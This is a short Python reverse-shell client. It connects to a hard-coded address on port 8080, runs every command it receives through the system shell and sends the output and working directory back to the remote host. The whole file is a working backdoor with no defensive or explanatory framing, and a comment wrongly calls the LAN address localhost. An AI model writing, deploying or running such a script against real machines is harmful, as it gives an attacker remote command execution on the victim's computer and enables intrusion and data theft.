import socket
import subprocess
import os

s=socket.socket()
#this is localhost
host="192.168.43.245"
port=8080
s.connect((host,port))

while True:
    data=s.recv(1024)
    #data check
    if data[:2].decode("utf-8") == 'cd':
        os.chdir(data[3:].decode("utf-8"))
    if len(data)>0:
        cmd=subprocess.Popen(data[:].decode("utf-8"),shell=True,stdout=subprocess.PIPE,stdin=subprocess.PIPE,stderr=subprocess.PIPE)
        output_bytes=cmd.stdout.read()+cmd.stderr.read()
        output_str=str(output_bytes,"utf-8")
        current_Dir=os.getcwd()+"> "
        s.send(str.encode(output_str+current_Dir))
        print(output_str)





